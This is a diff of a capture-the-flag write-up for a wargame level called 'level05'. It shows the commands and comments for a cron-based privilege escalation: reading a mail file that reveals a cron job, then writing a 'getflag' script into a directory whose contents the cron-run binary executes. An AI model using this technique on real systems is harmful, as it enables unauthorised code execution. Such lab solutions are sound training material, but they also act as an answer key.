@@ -1,4 +1,12 @@
+## cron exploit
 find / -name 'level05'  2>/dev/null
-cat /var/mail/level05
+cat /var/mail/level05 # open crontab file
 cat  /usr/sbin/openarenaserver
-echo 'getflag > /tmp/flag' > /opt/openarenaserver/exploit && sleep 180 && cat /tmp/flag && echo
+echo 'getflag > /tmp/flag' > /opt/openarenaserver/exploit && sleep 121 && cat /tmp/flag 
+echo 'getflag > /tmp/flag' > /opt/openarenaserver/exploit && cat /tmp/flag 
+
+# find a crontab file in mail -> find a binary file -> create file called exploit in a folder where openarena operates
+# -> put in it a command using echos -> wait two minutes and cut
+# ulimit -t - specifies a process' maximum running time, in seconds. 
+# binary file opens value in a directory and runs it 
+# in mail we see cronfile which executes openarenaserver every two minutes
